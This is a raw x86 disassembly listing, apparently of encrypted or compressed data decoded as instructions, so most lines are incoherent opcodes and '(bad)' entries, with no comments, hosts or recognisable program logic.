  41bd4b:	add    BYTE PTR [esi+0x75],bh
  41bd4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd4f:	push   ds
  41bd50:	(bad)  
  41bd51:	(bad)  
  41bd53:	repnz mov ds:0xbfd129ae,eax
  41bd59:	mov    al,ds:0x88a6a970
  41bd5e:	imul   ebx,DWORD PTR [ebx+0x3afba4d8],0xa10efe4b
  41bd68:	call   0x2b6a39c
  41bd6d:	dec    esp
  41bd6e:	fdiv   st,st(7)
  41bd70:	ja     0x41bd08
  41bd72:	adc    BYTE PTR [esi-0x66],dh
  41bd75:	add    esi,0xfffffff9
  41bd78:	sti    
  41bd79:	jecxz  0x41bd3d
  41bd7b:	ficomp WORD PTR [edx]
  41bd7d:	daa    
  41bd7e:	push   ebp
  41bd7f:	xchg   ecx,eax
  41bd80:	aaa    
  41bd81:	leave  
  41bd82:	jg     0x41bdde
  41bd84:	sahf   
  41bd85:	sbb    ah,BYTE PTR [ebx]
  41bd87:	(bad)  
  41bd88:	dec    ecx
  41bd89:	mov    al,0xc9
  41bd8b:	mov    eax,ds:0x6862ec1a
  41bd90:	js     0x41bd6f
  41bd92:	dec    esi
  41bd93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd94:	ins    BYTE PTR es:[edi],dx
  41bd95:	mov    esp,0x1ed1091f
  41bd9a:	out    0x89,eax
  41bd9c:	push   ebp
  41bd9d:	jp     0x41bdef
  41bd9f:	dec    ebp
  41bda0:	test   eax,0x95adea62
  41bda5:	iret   
  41bda6:	pop    ss
  41bda7:	in     eax,dx
  41bda8:	jmp    0x50eb:0xda7f3100
  41bdaf:	pop    ebp
  41bdb0:	jmp    0x41bd3b
  41bdb2:	mov    ebx,0x2ded90a8
  41bdb7:	test   eax,0xdfd9519e
  41bdbc:	or     BYTE PTR [ecx],0x90
  41bdbf:	cmp    al,0x44
  41bdc1:	xchg   ebx,eax
  41bdc2:	pop    ebp
  41bdc3:	aad    0xa9
  41bdc5:	sti    
  41bdc6:	and    eax,0x414cbcfd
  41bdcb:	pop    edi
  41bdcc:	mov    dh,0xe7
  41bdce:	push   ecx
  41bdcf:	nop
  41bdd0:	ret    0x2da7
  41bdd3:	call   0xad5a8e23
  41bdd8:	inc    esi
  41bdd9:	cwde   
  41bdda:	lods   al,BYTE PTR ds:[esi]
  41bddb:	add    edx,DWORD PTR [eax-0xa]
  41bdde:	pop    ebp
  41bddf:	(bad)  
  41bde0:	mov    al,ds:0x5dfcfec3
  41bde5:	out    0xc2,al
  41bde7:	xlat   BYTE PTR ds:[ebx]
  41bde8:	mov    eax,ds:0xbe325a4
  41bded:	fild   QWORD PTR [eax-0x5f3999d6]
  41bdf3:	repnz and cl,BYTE PTR [ebx]
  41bdf6:	jmp    FWORD PTR [edx-0x27a04cbb]
  41bdfc:	call   0xad32:0x41d0195
  41be03:	jb     0x41be44
  41be05:	dec    eax
  41be06:	push   ss
  41be07:	enter  0x515f,0xfc
  41be0b:	rcr    ah,0xf1
  41be0e:	cwde   
  41be0f:	call   0xf652:0x9c9dfc54
  41be16:	adc    DWORD PTR [ebp-0x2c],0x50377b2
  41be1d:	fbstp  TBYTE PTR [ecx-0x45]
  41be20:	mov    edx,0x977845
  41be25:	pop    esp
  41be26:	mov    BYTE PTR ss:[eax],ch
  41be29:	mov    ah,0x32
  41be2b:	dec    esi
  41be2c:	add    bl,BYTE PTR [eax+0x32fe4fe0]
  41be32:	jmp    0x41bdcc
  41be34:	or     dl,BYTE PTR [ebx-0x61c4b5eb]
  41be3a:	jg     0x41be0a
  41be3c:	xchg   edi,eax
  41be3d:	sbb    al,0xa3
  41be3f:	out    0xf8,eax
  41be41:	das    
	...
  41beb2:	add    BYTE PTR [eax],al
  41beb4:	(bad)  
  41beb7:	xor    edi,DWORD PTR [ebp-0x57002089]
  41bebd:	ja     0x41bf3b
  41bebf:	(bad)  
  41bec1:	add    BYTE PTR ds:0x12d9e42,dh
  41bec7:	add    dh,dh
  41bec9:	add    BYTE PTR [eax],al
  41becb:	add    al,bl
  41becd:	dec    esp
  41bece:	(bad)  
  41becf:	add    BYTE PTR [edx-0x5b],bh
  41bed2:	call   0x153b:0x3952f12b
  41bed9:	dec    esi
  41beda:	(bad)  
  41bedb:	mov    cs,WORD PTR [ebx-0x399b2ec6]
  41bee1:	pop    ss
  41bee2:	mov    ch,0x3e
  41bee4:	not    edi
  41bee6:	call   0xe968882b
  41beeb:	stc    
  41beec:	retf   
  41beed:	pop    edi
  41beee:	ins    DWORD PTR es:[edi],dx
  41beef:	iret   
  41bef0:	arpl   WORD PTR [esi-0x7d9b48f1],bx
  41bef6:	mov    ecx,0xa7ddf541
  41befb:	xor    dl,BYTE PTR [edx+0x5b6bba01]
  41bf01:	inc    eax
  41bf02:	sub    bh,bl
  41bf04:	adc    DWORD PTR [ebx],eax
  41bf06:	xor    DWORD PTR [edi+0x2b070400],ebp
  41bf0c:	clc    
  41bf0d:	ja     0x41bee0
  41bf0f:	add    eax,0x5870a65
  41bf14:	push   eax
  41bf15:	out    0xc1,al
  41bf17:	mov    eax,ds:0xf0de83a5
  41bf1c:	xchg   edi,eax
  41bf1d:	fstp   DWORD PTR [ebp+0x45093a6c]
  41bf23:	and    ebx,DWORD PTR [ecx+0x6e]
  41bf26:	jl     0x41beb6
  41bf28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf29:	mov    ch,0xc6
  41bf2b:	iret   
  41bf2c:	cld    
  41bf2d:	fisubr DWORD PTR [ecx-0x5b70235]
  41bf33:	int    0x57
  41bf35:	push   0xfbd88ca3
  41bf3a:	xchg   ecx,eax
  41bf3b:	shl    ch,0x36
  41bf3e:	and    bl,BYTE PTR [edi-0x72]
  41bf41:	sbb    DWORD PTR ds:0xe68d5e72,esi
  41bf47:	cmc    
  41bf48:	stos   DWORD PTR es:[edi],eax
  41bf49:	ret    
  41bf4a:	cmp    ebx,DWORD PTR [ecx+eiz*8+0x75903f1d]
  41bf51:	aam    0x4f
  41bf53:	data16 fwait
  41bf55:	hlt    
  41bf56:	cld    
  41bf57:	inc    edx
  41bf58:	movzx  edx,bl
  41bf5b:	cmp    ecx,DWORD PTR [ebx]
  41bf5d:	inc    ebx
  41bf5e:	sub    esi,DWORD PTR [edx+ecx*2-0xf]
  41bf62:	inc    ebp
  41bf63:	xchg   BYTE PTR [edi],ah
  41bf65:	dec    edi
  41bf66:	pop    es
  41bf67:	sbb    al,0x7e
  41bf69:	dec    ebp
  41bf6a:	repz jo 0x41bf17
  41bf6d:	inc    esi
  41bf6e:	jmp    0xae26be07
  41bf73:	inc    esi
  41bf74:	and    DWORD PTR cs:[edx-0x7],0x72
  41bf79:	fcom   DWORD PTR [edx+eax*1]
  41bf7c:	push   edi
  41bf7d:	ret    0xc6ab
  41bf80:	icebp  
  41bf81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf82:	test   al,0xbb
  41bf84:	pop    esi
  41bf85:	int3   
  41bf86:	jecxz  0x41bfa3
  41bf88:	lahf   
  41bf89:	loop   0x41bfe2
  41bf8b:	jne    0x41bf13
  41bf8d:	sub    BYTE PTR [ecx],ch
  41bf8f:	xor    BYTE PTR [ecx],dl
  41bf91:	cmp    edi,DWORD PTR [eax+0x37ff2745]
  41bf97:	lods   al,BYTE PTR ds:[esi]
  41bf98:	in     al,0x87
  41bf9a:	aam    0x83
  41bf9c:	fiadd  DWORD PTR [eax+esi*1+0x7479cebd]
  41bfa3:	jns    0x41bf7d
  41bfa5:	jg     0x41bfbc
  41bfa7:	push   esi
  41bfa8:	ss loopne 0x41c000
  41bfab:	mov    edi,0x14ee14ca
  41bfb0:	mov    ecx,ecx
  41bfb2:	(bad)  
  41bfb3:	fld    QWORD PTR [esi]
  41bfb5:	add    BYTE PTR [edi],dl
  41bfb7:	neg    BYTE PTR [ecx-0xa7a2e3e]
  41bfbd:	adc    eax,0x3fbb0f70
	...
  41c032:	add    BYTE PTR [eax],al
  41c034:	(bad)  
  41c035:	ficom  WORD PTR [eax]
  41c037:	stos   DWORD PTR es:[edi],eax
  41c038:	sbb    bh,ch
  41c03a:	(bad)  
  41c03b:	jmp    FWORD PTR [esi-0x4944657f]
  41c041:	mov    esp,0x2e941108
  41c046:	add    DWORD PTR [eax],eax
  41c048:	test   BYTE PTR [eax],0x0
  41c04b:	add    BYTE PTR [eax],cl
  41c04d:	repnz ins BYTE PTR es:[edi],dx
  41c04f:	inc    ebp
  41c050:	ffree  st(5)
  41c052:	rol    BYTE PTR [eax],cl
  41c054:	xor    al,0xf
  41c057:	mov    bl,0x26
  41c059:	mov    eax,DWORD PTR [edi]
  41c05b:	and    BYTE PTR [ecx],ch
  41c05d:	and    ch,BYTE PTR [edi]
  41c05f:	imul   esi,DWORD PTR [eax+0x48a5be28],0x16795f3c
  41c069:	mov    ds,WORD PTR [eax+0x48]
  41c06c:	sbb    edi,DWORD PTR [ecx+0x37]
  41c06f:	test   eax,0x9bd76127
  41c074:	(bad)  
  41c075:	ror    BYTE PTR [esi-0x3d],1
  41c078:	imul   esp,DWORD PTR [edx+0x71],0x9
  41c07c:	xlat   BYTE PTR ds:[ebx]
  41c07d:	mov    edx,edi
  41c07f:	xor    DWORD PTR [ebx-0x1bba9283],esi
  41c085:	jbe    0x41c0d5
  41c087:	js     0x41c0ef
  41c089:	cmp    edx,DWORD PTR [esi+ecx*2+0x8]
  41c08d:	imul   BYTE PTR ds:[ecx-0x64518056]
  41c094:	dec    ecx
  41c095:	imul   esp,DWORD PTR [esi+edi*2-0x18],0x42
  41c09a:	ficom  DWORD PTR [ebp+0x7490a84e]
  41c0a0:	or     al,0xa0
  41c0a2:	mov    cl,0x85
  41c0a4:	and    dl,BYTE PTR [ecx-0x52]
  41c0a7:	jmp    0x41c059
  41c0a9:	mov    esi,esi
  41c0ab:	add    al,0x50
  41c0ad:	fisubr DWORD PTR [edi+0xf]
  41c0b0:	and    al,0xfb
  41c0b2:	cmp    cl,BYTE PTR [esi-0x47]
  41c0b5:	push   esi
  41c0b6:	cdq    
  41c0b7:	mov    ecx,0x46acee2c
  41c0bc:	add    BYTE PTR [eax],ah
  41c0be:	mov    cl,0xad
  41c0c0:	add    cl,bl
  41c0c2:	daa    
  41c0c3:	aad    0x93
  41c0c5:	jge    0x41c087
  41c0c7:	xchg   ebx,eax
  41c0c8:	imul   edx,DWORD PTR [edi-0x73],0x5a3162a1
  41c0cf:	enter  0xd8db,0x46
  41c0d3:	lock stos DWORD PTR es:[edi],eax
  41c0d5:	aas    
  41c0d6:	add    BYTE PTR [edi+0x47],0x92
  41c0da:	jb     0x41c0e7
  41c0dc:	sub    eax,0x40c35636
  41c0e1:	sbb    eax,0x90ec5eee
  41c0e6:	ja     0x41c09d
  41c0e8:	jl     0x41c115
  41c0ea:	cmp    ebx,edx
  41c0ec:	xchg   edi,eax
  41c0ed:	pop    ds
  41c0ee:	sbb    ebx,0x32e0e8a8
  41c0f4:	inc    ebx
  41c0f5:	xchg   DWORD PTR [esi+0x66],edx
  41c0f8:	add    ecx,DWORD PTR [ebx-0x3cf68fa2]
  41c0fe:	iret   
  41c0ff:	ds mov ah,0xf1
  41c102:	pop    edi
  41c103:	cmp    eax,0x1303df3c
  41c108:	push   ebx
  41c109:	or     eax,ebx
  41c10b:	jp     0x41c137
  41c10d:	push   esp
  41c10e:	aas    
  41c10f:	mov    fs,WORD PTR [edx+edi*4+0x7440886f]
  41c116:	inc    eax
  41c117:	scas   al,BYTE PTR es:[edi]
  41c118:	bound  ecx,QWORD PTR [ecx]
  41c11a:	xchg   esp,ecx
  41c11c:	pop    es
  41c11d:	dec    eax
  41c11e:	adc    dh,BYTE PTR [edx]
  41c120:	push   cs
  41c121:	out    dx,eax
  41c122:	jns    0x41c17a
  41c124:	sub    BYTE PTR [eax-0x13],0xd9
  41c128:	add    bl,al
  41c12a:	popf   
  41c12b:	add    eax,0x718a7dc0
  41c131:	push   ds
  41c132:	cmp    edi,0xffffff95
  41c135:	cmp    BYTE PTR [ebx],dl
  41c137:	(bad)
  41c13b:	test   eax,0xba472021
  41c140:	sbb    dl,BYTE PTR [edx+0x0]
	...
  41c1b3:	add    BYTE PTR [esi+0x6be069a5],cl
  41c1b9:	in     al,dx
  41c1ba:	(bad)  
  41c1bb:	out    dx,eax
  41c1bc:	sbb    BYTE PTR [edi],0x8e
  41c1bf:	sbb    eax,0x7fd89c5f
  41c1c4:	mov    ch,BYTE PTR [edi]
  41c1c6:	add    DWORD PTR [eax],eax
  41c1c8:	test   BYTE PTR [eax],0x0
  41c1cb:	add    BYTE PTR [ebx],bl
  41c1cd:	mov    ebx,0x1f93bc9
  41c1d2:	mov    DWORD PTR [edx-0x6063bce4],0x536c9914
  41c1dc:	jge    0x41c1d1
  41c1de:	inc    edi
  41c1df:	sti    
  41c1e0:	jmp    0xdc74:0x52f11085
  41c1e7:	sbb    ah,BYTE PTR [esi+0x6fe2d17b]
  41c1ed:	push   ds
  41c1ee:	jl     0x41c1f6
  41c1f0:	enter  0xcbf7,0xd3
  41c1f4:	pop    edi
  41c1f5:	repnz mov bl,0xdb
  41c1f8:	xchg   BYTE PTR [edi],al
  41c1fa:	sbb    al,0xee
  41c1fc:	shl    DWORD PTR [edx+0x1dcba6da],1
  41c202:	loop   0x41c1ca
  41c204:	ins    DWORD PTR es:[edi],dx
  41c205:	in     eax,0xa9
  41c207:	ds (bad) 
  41c209:	jb     0x41c226
  41c20b:	cmc    
  41c20c:	pusha  
  41c20d:	test   eax,0x6ed38880
  41c212:	js     0x41c213
  41c214:	mov    ds:0x9c165ac5,al
  41c219:	jp     0x41c280
  41c21b:	xor    eax,0xabb4fb4f
  41c220:	inc    eax
  41c221:	jp     0x41c1a3
  41c223:	add    BYTE PTR ds:0xfba43f6a,bh
  41c229:	or     eax,0x6d0a2e41
  41c22e:	xchg   ebx,eax
  41c22f:	sti    
  41c230:	popa   
  41c231:	pop    edi
  41c232:	and    al,0xb6
  41c234:	cmp    DWORD PTR [eax-0x7d],esi
  41c237:	mov    esp,ebx
  41c239:	push   es
  41c23a:	and    eax,0xdc039f71
  41c23f:	add    DWORD PTR [esi],esi
  41c241:	add    ah,BYTE PTR [ebp+0x35]
  41c244:	xchg   edi,eax
  41c245:	pop    es
  41c246:	je     0x41c24b
  41c248:	and    eax,0x54fd99de
  41c24d:	(bad)  
  41c24e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c24f:	and    BYTE PTR [ebp+eax*2+0x16],cl
  41c253:	sub    BYTE PTR [ecx+ebp*8-0x44a724c5],bh
  41c25a:	push   eax
  41c25b:	push   eax
  41c25c:	ins    BYTE PTR es:[edi],dx
  41c25d:	xor    DWORD PTR [eax+0x32],eax
  41c260:	add    DWORD PTR [edx+0x7552ec79],0x8
  41c267:	mov    dl,BYTE PTR [eax+0x12]
  41c26a:	push   ecx
  41c26b:	sbb    bh,BYTE PTR [edx+0x37]
  41c26e:	aaa    
  41c26f:	jge    0x41c205
  41c271:	pop    ebx
  41c272:	mov    ebp,0xf3d3f2c0
  41c277:	pop    ebx
  41c278:	and    cl,BYTE PTR ds:0x777f417d
  41c27e:	pusha  
  41c27f:	push   edx
  41c280:	pop    edx
  41c281:	ret    0xc51f
  41c284:	jmp    0x2166c6e7
  41c289:	add    dh,bh
  41c28b:	pop    ebp
  41c28c:	scas   eax,DWORD PTR es:[edi]
  41c28d:	sahf   
  41c28e:	lea    ecx,[ecx]
  41c290:	pop    ecx
  41c291:	dec    BYTE PTR [edi+ecx*2+0x27]
  41c295:	jo     0x41c302
  41c297:	cwde   
  41c298:	loopne 0x41c22b
  41c29a:	mov    dh,0xaf
  41c29c:	add    al,BYTE PTR [esi+0x11bf2cd]
  41c2a2:	cmp    al,0x5b
  41c2a4:	or     DWORD PTR [ebp+0x73],eax
  41c2a7:	jne    0x41c254
  41c2a9:	dec    eax
  41c2aa:	push   es
  41c2ab:	jns    0x41c317
  41c2ad:	mov    ecx,0x474ac2f3
  41c2b2:	jle    0x41c277
  41c2b4:	inc    ebx
  41c2b5:	ret    0x860
  41c2b8:	xchg   edx,eax
  41c2b9:	cdq    
  41c2ba:	icebp  
  41c2bb:	sub    esp,DWORD PTR [esi]
  41c2bd:	shl    BYTE PTR [ebx],1
  41c2bf:	cmp    DWORD PTR [esi+0xed],eax
	...
  41c331:	add    BYTE PTR [eax],al
  41c333:	add    BYTE PTR [eax+0xd],cl
  41c336:	sbb    eax,0xfebb5dab
  41c33b:	out    dx,eax
  41c33c:	aad    0x1f
  41c33e:	jo     0x41c35e
  41c340:	mov    ebp,0x80432c6b
  41c345:	xor    BYTE PTR [ecx],al
  41c347:	add    dh,dh
  41c349:	add    BYTE PTR [eax],al
  41c34b:	add    BYTE PTR [ecx+ebp*8-0x4365c420],dh
  41c352:	data16 rcl BYTE PTR [ebp-0x508324d8],0x3d
  41c35a:	stos   DWORD PTR es:[edi],eax
  41c35b:	(bad)  
  41c35c:	lahf   
  41c35d:	push   edi
  41c35e:	inc    edx
  41c35f:	ins    DWORD PTR es:[edi],dx
  41c360:	cmp    esp,DWORD PTR [ebx+ecx*4-0x77c81451]
  41c367:	stc    
  41c368:	mov    ds:0xf922f6c4,al
  41c36d:	ja     0x41c3e2
  41c36f:	xchg   ebp,eax
  41c370:	fdivp  st(3),st
  41c372:	outs   dx,BYTE PTR ds:[esi]
  41c373:	push   0xffffff9b
  41c375:	cmc    
  41c376:	dec    ecx
  41c377:	xchg   ebp,eax
  41c378:	inc    esp
  41c379:	mov    ecx,0xbf9f0c04
  41c37e:	retf   0xe297
  41c381:	sbb    BYTE PTR [ecx+0x19],al
  41c384:	dec    ecx
  41c385:	and    bl,BYTE PTR [ebp+0x6b]
  41c388:	mov    fs,WORD PTR ds:0x9adf62ef
  41c38e:	fdiv   QWORD PTR [ebp-0x23]
  41c391:	mov    edx,0xeeba6e6b
  41c396:	and    DWORD PTR ds:0xbb4d134d,edx
  41c39c:	xchg   ebp,eax
  41c39d:	cmova  esi,DWORD PTR [eax-0x3082d59f]
  41c3a4:	shl    BYTE PTR [eax+0x162e7ddb],1
  41c3aa:	aas    
  41c3ab:	inc    eax
  41c3ac:	std    
  41c3ad:	mov    al,ds:0x670e8192
  41c3b2:	cmp    ebx,esp
  41c3b4:	aad    0xa
  41c3b6:	fmul   QWORD PTR [esi+0x28f428e8]
  41c3bc:	cmp    edi,eax
  41c3be:	(bad)  
  41c3bf:	sbb    DWORD PTR [ecx-0x35],ecx
  41c3c2:	jns    0x41c3d8
  41c3c4:	dec    ebx
  41c3c5:	in     al,dx
  41c3c6:	adc    eax,0x18d32b5e
  41c3cb:	dec    ecx
  41c3cc:	lea    edi,[eax-0x54d0ecc7]
  41c3d2:	out    dx,eax
  41c3d3:	test   al,0xab
  41c3d5:	push   esp
  41c3d6:	cmp    BYTE PTR [eax+0x490505c3],dh
  41c3dc:	aam    0xc
  41c3de:	inc    edx
  41c3df:	mov    cl,0xa6
  41c3e1:	adc    dl,BYTE PTR [eax]
  41c3e3:	inc    eax
  41c3e4:	fdivr  QWORD PTR [eax]
  41c3e6:	test   eax,0xb203d2d7
  41c3eb:	sete   dh
  41c3ee:	ins    DWORD PTR es:[edi],dx
  41c3ef:	sub    cl,BYTE PTR [edx-0x32]
  41c3f2:	xchg   esp,eax
  41c3f3:	xchg   edi,eax
  41c3f4:	xchg   DWORD PTR [edx+0x46abefa5],ebp
  41c3fa:	jg     0x41c3ba
  41c3fc:	sbb    eax,0x98706c93
  41c401:	mov    ah,0xf6
  41c403:	loop   0x41c427
  41c405:	bound  ebx,QWORD PTR [edx+0x4e]
  41c408:	xchg   esi,esi
  41c40a:	leave  
  41c40b:	popf   
  41c40c:	pop    bp
  41c40e:	inc    esp
  41c40f:	pop    ss
  41c410:	xchg   al,cl
  41c412:	and    eax,0x9f82b68f
  41c417:	test   DWORD PTR [edx+0x4b],eax
  41c41a:	add    eax,eax
  41c41c:	or     DWORD PTR [ebx],eax
  41c41e:	mov    bh,0xf8
  41c420:	aas    
  41c421:	dec    ebp
  41c422:	ror    ah,cl
  41c424:	mov    al,0x6c
  41c426:	in     eax,dx
  41c427:	outs   dx,DWORD PTR ds:[esi]
  41c428:	(bad)  
  41c429:	out    0x15,al
  41c42b:	(bad)  
  41c42c:	jmp    0xa478:0xc58ae621
  41c433:	inc    edx
  41c434:	cld    
  41c435:	pusha  
  41c436:	inc    ebx
  41c437:	mov    ecx,0x1611341a
  41c43c:	pop    ecx
  41c43d:	mul    DWORD PTR [eax+0x32fd51]
	...
  41c4b3:	add    ah,dl
  41c4b5:	in     al,dx
  41c4b6:	add    edi,edi
  41c4b8:	cmp    edi,edi
  41c4ba:	(bad)  
  41c4bb:	out    dx,eax
  41c4bc:	dec    edi
  41c4bd:	retf   
  41c4be:	fstp   TBYTE PTR [ebx-0x3e2b5d4]
  41c4c4:	jbe    0x41c4f7
  41c4c6:	add    DWORD PTR [eax],eax
  41c4c8:	test   BYTE PTR [eax],0x0
  41c4cb:	add    ch,ch
  41c4cd:	lahf   
  41c4ce:	out    0x15,eax
  41c4d0:	add    al,0x78
  41c4d2:	int    0xf7
  41c4d4:	test   eax,0x7929f9f7
  41c4d9:	call   0x421:0x99418b01
  41c4e0:	mov    BYTE PTR [ebp-0x49],bl
  41c4e3:	inc    edi
  41c4e4:	inc    eax
  41c4e5:	cmp    eax,0x9d93d541
  41c4ea:	push   ds
  41c4eb:	test   eax,0x7149cdee
  41c4f0:	out    dx,al
  41c4f1:	ret    
  41c4f2:	and    edi,ebp
  41c4f4:	nop
  41c4f5:	in     al,0xd0
  41c4f7:	scas   al,BYTE PTR es:[edi]
  41c4f8:	push   0xfffffffd
  41c4fa:	mov    esp,0x5dcf788a
  41c4ff:	mov    es,WORD PTR [eax+edi*8-0x410ef1e9]
  41c506:	cdq    
  41c507:	and    BYTE PTR [esi],bh
  41c509:	bound  esi,QWORD PTR [ecx+0x77]
  41c50c:	aas    
  41c50d:	out    dx,al
  41c50e:	jnp    0x41c4fa
  41c510:	out    dx,al
  41c511:	pop    ebp
  41c512:	xlat   BYTE PTR ds:[ebx]
  41c513:	ds push ecx
  41c515:	sbb    eax,0x5ae945b6
  41c51a:	in     al,dx
  41c51b:	pop    esp
  41c51c:	inc    esi
  41c51d:	mov    ds:0x1a6481ce,al
  41c522:	pop    ebx
  41c523:	inc    edx
  41c524:	mov    ebp,0xbc0e2409
  41c529:	mov    esp,0xb5a0daf8
  41c52e:	xlat   BYTE PTR ds:[ebx]
  41c52f:	xlat   BYTE PTR ds:[ebx]
  41c530:	mov    eax,ds:0x3687f8bb
  41c535:	pushf  
  41c536:	in     eax,0x41
  41c538:	aas    
  41c539:	in     al,dx
  41c53a:	cdq    
  41c53b:	(bad)  
  41c53d:	xchg   eax,ecx
  41c53f:	xchg   ecx,eax
  41c540:	push   edx
  41c541:	call   FWORD PTR [eax+0x8284be8]
  41c547:	std    
  41c548:	sbb    DWORD PTR [eax+0x2f],eax
  41c54b:	sbb    eax,0x2749a956
  41c550:	cmp    esp,DWORD PTR [ebp+esi*2-0x22b72305]
  41c557:	int3   
  41c558:	jbe    0x41c50e
  41c55a:	push   esi
  41c55b:	mov    ds:0xf73f6f70,eax
  41c560:	sbb    BYTE PTR [esi],bl
  41c562:	jne    0x41c52f
  41c564:	nop
  41c565:	or     eax,0x4a084c9a
  41c56a:	outs   dx,BYTE PTR ds:[esi]
  41c56b:	retf   0x67fb
  41c56e:	stc    
  41c56f:	mov    eax,ds:0x6e6cacaf
  41c574:	jae    0x41c517
  41c576:	mov    bl,0x49
  41c578:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c579:	int    0xc3
  41c57b:	test   DWORD PTR [edi+esi*1-0x42c97ad6],ecx
  41c582:	cmp    BYTE PTR [eax+0x1a57ab71],dh
  41c588:	pop    esp
  41c589:	fild   WORD PTR ds:0xdd700119
  41c58f:	cmp    BYTE PTR [edx],al
  41c591:	and    eax,0xa042e90e
  41c596:	mov    edi,0xb7a25d86
  41c59b:	out    dx,al
  41c59c:	jb     0x41c5bb
  41c59e:	ret    0x2715
  41c5a1:	stc    
  41c5a2:	daa    
  41c5a3:	mov    WORD PTR ds:0xa2768fe4,es
  41c5a9:	or     BYTE PTR [edx+edi*1],bh
  41c5ac:	ja     0x41c61e
  41c5ae:	ins    DWORD PTR es:[edi],dx
  41c5af:	xor    ch,cl
  41c5b1:	sub    ch,BYTE PTR [eax+0x12ba113a]
  41c5b7:	stos   BYTE PTR es:[edi],al
  41c5b8:	or     BYTE PTR [ebp+0x9fd28b],ch
  41c5be:	lods   al,BYTE PTR ds:[esi]
  41c5bf:	dec    esi
  41c5c0:	(bad)  
  41c5c1:	sti    
	...
  41c632:	add    BYTE PTR [eax],al
  41c634:	test   al,0x63
  41c636:	sbb    edx,DWORD PTR [esi+0x7fadfedb]
  41c63c:	out    dx,eax
  41c63d:	add    al,0x38
  41c63f:	lods   al,BYTE PTR ds:[esi]
  41c640:	arpl   WORD PTR [ebx+0x326c8b47],si
  41c646:	add    DWORD PTR [eax],eax
  41c648:	test   BYTE PTR [eax],0x0
  41c64b:	add    BYTE PTR [ebp+0x60ed067c],ch
  41c651:	and    dl,BYTE PTR ds:0xa83967c
  41c657:	mov    ecx,0xcf4a7851
  41c65c:	(bad)  
  41c65d:	test   eax,0xb1116d36
  41c662:	scas   eax,DWORD PTR es:[edi]
  41c663:	add    ch,BYTE PTR [esi]
  41c665:	add    eax,0x309c856a
  41c66a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c66b:	jb     0x41c678
  41c66d:	adc    edi,DWORD PTR [ebp+eiz*1+0x2dde4cfd]
  41c674:	push   ss
  41c675:	and    BYTE PTR [esp-0x4bdf1858],dh
  41c67c:	jge    0x41c6e9
  41c67e:	or     eax,0x88f9cbff
  41c683:	cld    
  41c684:	xchg   DWORD PTR [ebp+edx*1-0x615d2a4e],esi
  41c68b:	xchg   ebp,eax
  41c68c:	jno    0x41c66f
  41c68e:	sbb    BYTE PTR [edx+0x39a810a],bl
  41c694:	dec    ecx
  41c695:	leave  
  41c696:	bound  edi,QWORD PTR [ebx-0x2e29917a]
  41c69c:	xor    DWORD PTR [ebx],esp
  41c69e:	and    esp,edi
  41c6a0:	scas   eax,DWORD PTR es:[edi]
  41c6a1:	cmp    ch,BYTE PTR [esi]
  41c6a3:	cwde   
  41c6a4:	retf   
  41c6a5:	hlt    
  41c6a6:	retf   0x2098
  41c6a9:	xor    ch,BYTE PTR [eax-0x2a]
  41c6ac:	fbstp  TBYTE PTR [edx-0x5bea9c86]
  41c6b2:	or     eax,0xdad2c0c
  41c6b7:	outs   dx,BYTE PTR ds:[esi]
  41c6b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c6b9:	jmp    0x41c6a7
  41c6bb:	in     eax,dx
  41c6bc:	std    
  41c6bd:	push   ebx
  41c6be:	xchg   ebp,edx
  41c6c0:	adc    al,0x99
  41c6c2:	ret    
  41c6c3:	adc    DWORD PTR [ebp-0x16],0x8a66a7d5
  41c6ca:	lods   eax,DWORD PTR ds:[esi]
  41c6cb:	dec    ebp
  41c6cc:	inc    esi
  41c6cd:	jae    0x41c681
  41c6cf:	and    al,0x70
  41c6d1:	xor    ch,BYTE PTR [ecx]
  41c6d3:	ror    DWORD PTR [edi+0x6be706cb],0x23
  41c6da:	xrelease mov DWORD PTR [eax],edi
  41c6dd:	pop    ss
  41c6de:	mov    ebp,0x551077b5
  41c6e3:	dec    ebp
  41c6e4:	out    dx,eax
  41c6e5:	fcom   QWORD PTR [esi]
  41c6e7:	stos   DWORD PTR es:[edi],eax
  41c6e8:	aaa    
  41c6e9:	out    0x9d,al
  41c6eb:	test   DWORD PTR [eax-0x57],eax
  41c6ee:	pop    esp
  41c6ef:	and    ecx,edx
  41c6f1:	mov    dl,0x72
  41c6f3:	xor    BYTE PTR [ebp-0x22],dl
  41c6f6:	mov    ?,WORD PTR [ebx-0x4c]
  41c6f9:	push   esp
  41c6fa:	shr    cl,cl
  41c6fc:	jne    0x41c6c9
  41c6fe:	and    ecx,ebx
  41c700:	adc    eax,0x77036ad1
  41c705:	test   BYTE PTR [eax],dl
  41c707:	retf   0x7cc0
  41c70a:	mov    esi,0x6bbeb31
  41c70f:	adc    DWORD PTR [ebp-0x3e],edx
  41c712:	inc    edi
  41c713:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c714:	imul   ecx,DWORD PTR [edi+ecx*1],0x1a
  41c718:	test   al,0x2d
  41c71a:	mov    ds:0x2ed19426,eax
  41c71f:	and    al,0xe
  41c721:	mov    ecx,0x30caa339
  41c726:	and    BYTE PTR [ecx],ah
  41c728:	fwait
  41c729:	gs xor bh,dl
  41c72c:	ret    
  41c72d:	sub    ch,BYTE PTR [eax-0x26]
  41c730:	xor    al,0x55
  41c732:	sub    edx,DWORD PTR [eax]
  41c734:	mov    dl,0x52
  41c736:	mov    ?,WORD PTR [bx+si-0x3c]
  41c73a:	jns    0x41c71f
  41c73c:	adc    al,0x98
  41c73e:	imul   ebp,DWORD PTR [ebx+ecx*1-0x7c],0x0
	...
  41c7b3:	add    BYTE PTR [edx-0x8b13804],cl
  41c7b9:	jg     0x41c746
  41c7bb:	cld    
  41c7bc:	add    edi,esp
  41c7be:	adc    eax,0xd9477554
  41c7c3:	(bad)  
  41c7c4:	bound  esi,QWORD PTR [ebx]
  41c7c6:	add    DWORD PTR [eax],eax
  41c7c8:	test   BYTE PTR [eax],0x0
  41c7cb:	add    dl,ch
  41c7cd:	enter  0x8472,0xc4
  41c7d1:	lea    ecx,[esi+0x19c365ac]
  41c7d7:	gs push ds
  41c7d9:	int    0x58
